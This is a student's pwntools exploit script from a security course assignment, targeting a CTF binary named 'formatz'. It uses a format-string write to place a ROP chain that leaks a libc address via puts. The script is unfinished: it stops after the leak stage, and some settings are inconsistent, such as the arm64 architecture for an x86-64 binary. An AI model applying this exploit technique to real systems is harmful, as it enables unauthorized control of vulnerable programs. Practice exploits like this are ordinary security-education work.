'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     PCP16: 
File Description:  

Checksec info:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   70) Symbols       No    0               2               formatz


File info:
formatz: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=05a675d5e3199650c2d6eead61f1be6a3aa56f66, for GNU/Linux 3.2.0, not stripped


Radare2:
afl --> list all functions

nc 165.22.46.243 8877
'''

# Import Libraries
from pwn import *

# Setup - External
HOST = "165.22.46.243"
PORT = 8877

# Used to get 
print("ELF OF BINARY:")
elf = ELF("./formatz")

# Knows the context to debug in
DEBUG = False
if(DEBUG):
    context.log_level = "debug"
context.arch = "arm64"
context.binary = elf

def progEnv():
    libc = ELF('/usr/lib64/ld-linux-x86-64.so.2')      # Use local libc library
    return process(elf.path)                # Start a process to use ----> Used and can be stored in a variable
    '''     COMMENTED OUT FOR NOW TO TEST LOCALLY
    if args.LOCAL:
        libc = ELF('/usr/lib/libc-2.33.so', checksec=False)
        return process([elf.path])
    else: runningProc.recvuntil('0x')
        libc = ELF('./libc6_2.31-0ubuntu9.2_amd64.so', checksec=False)
        return remote(HOST, PORT), libc
    '''

# Used by the autopwner as a callback function to find payload
def exec_fmt(payload):
    p = process([elf.path])
    p.sendline(payload)
    return p.recvall()

def main():
    # Determine format string offset automatically --- pulled from CTF writeup, but prevents me from having to find the exact format
    autofmt = FmtStr(exec_fmt)
    offset = autofmt.offset
    # log.info(f'Format string offset: {offset}')

    # start process
    runningProc = progEnv()

    # Buffer length to smash, found in C code
    buffer = 0x150

    ##################################################
    #####               LEAK TIME                #####
    ##################################################

    # Pull leak info for GOT leak
    runningProc.recvuntil(b"This stack leak might be useful ")  # Used to differentiate the two leaks sinec both have similar wording
    GOTLeak = runningProc.recvuntil(b"\n")
    print("GOT LEAK: ", GOTLeak)        # Leak value check
    GOTLeakInt = int(GOTLeak, 16)

    # Pull leak info for Main leak
    runningProc.recvuntil(b"And this PIE leak might be useful ")
    PIELeak = runningProc.recvuntil(b"\n")
    print("PIE LEAK: ", PIELeak)        # Leak value check
    PIELeakInt = int(PIELeak, 16)

    # Find base of main
    elf.address = PIELeakInt - elf.symbols.main

    # The offset to RIP is calculated as following
    rip = GOTLeakInt + buffer + 8 # 8 = RBP length!
    
    # We make use of this useful gadget
    pop_rdi = elf.address + 0x00000000000012bb # pop rdi; ret;

    # This is the GOT leak location from above, want to call puts again to ensure next leak is called in ROP
    leak_func = 'setvbuf'
    payload = fmtstr_payload(offset, {rip: pop_rdi, rip+8: elf.got[leak_func], rip+16: elf.symbols['puts'], rip+24: elf.symbols['main']}, write_size='short')

    runningProc.sendline(payload)
    resp=runningProc.recv()
    print(resp)


# Execute the function main when written
if __name__ == "__main__":
    main()